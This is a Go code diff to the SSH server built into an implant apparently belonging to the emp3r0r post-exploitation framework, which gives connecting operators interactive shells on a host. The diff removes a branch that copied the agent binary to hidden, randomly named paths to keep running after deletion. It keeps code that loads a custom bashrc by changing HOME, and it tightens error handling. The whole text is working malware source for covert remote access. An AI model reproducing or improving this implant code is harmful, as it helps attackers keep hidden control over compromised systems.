@@ -33,7 +33,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 	}
 
 	exe, err := exec.LookPath(shell)
-	if err != nil && shell != "elvish" {
+	if err != nil {
 		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
 		log.Print(res)
 		return
@@ -46,23 +46,9 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 	}
 
 	ssh_server.Handle(func(s ssh.Session) {
-		// in case agent binary is deleted, elvish will need a new one
-		new_exe := fmt.Sprintf("%s/.%s", RuntimeConfig.UtilsPath, util.RandStr(22))
-		if shell == "elvish" {
-			// write process exe again
-			log.Printf("elvish: rewriting process exe to %s", new_exe)
-			CopySelfTo("/tmp/emp3r0r.restored")
-			err = CopySelfTo(new_exe)
-			if err != nil {
-				err = fmt.Errorf("%s not found (%v), aborting", exe, err)
-				s.Write([]byte(err.Error()))
-				log.Print(err)
-				return
-			}
-			exe = new_exe
-		}
 		cmd := exec.Command(exe, args...)
 		cmd.Env = os.Environ()
+		defer s.Close()
 
 		// we have a special bashrc and we would like to apply it
 		if shell == "bash" {
@@ -71,24 +57,20 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 				err = fmt.Errorf("sshd: custom bash not found: %s. Run `vaccine` to install", custom_bash)
 				log.Print(err)
 				s.Write([]byte(err.Error()))
+				return
 			}
 			err = ExtractBashRC()
 			if err != nil {
 				err = fmt.Errorf("sshd: extract built-in bashrc: %v", err)
 				log.Print(err)
 				s.Write([]byte(err.Error()))
+				return
 			}
 			cmd = exec.Command(exe)
 			bash_home := RuntimeConfig.UtilsPath // change home to use our bashrc
 			os.Setenv("HOME", bash_home)
 			os.Setenv("SHELL", cmd.Path)
 			cmd.Env = os.Environ()
-		}
-
-		// we also have a more special Evlsh
-		if shell == "elvish" {
-			cmd = exec.Command(exe)
-			cmd.Env = append(os.Environ(), "ELVISH=true")
 		}
 
 		// remove empty arg in cmd.Args
@@ -107,7 +89,8 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
 			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
 		} else {
-			log.Print("Got an SSH request")
+			log.Print("Got an SSH request, but not a PTY request, aborting")
+			s.Write([]byte("Not a PTY request"))
 			return
 		}
 		f, err := pty.Start(cmd)
@@ -117,7 +100,6 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			log.Print(err)
 			return
 		}
-		os.Remove(new_exe) // clean up our copy as elvish should be running and it's no longer needed
 
 		go func() {
 			for win := range winCh {
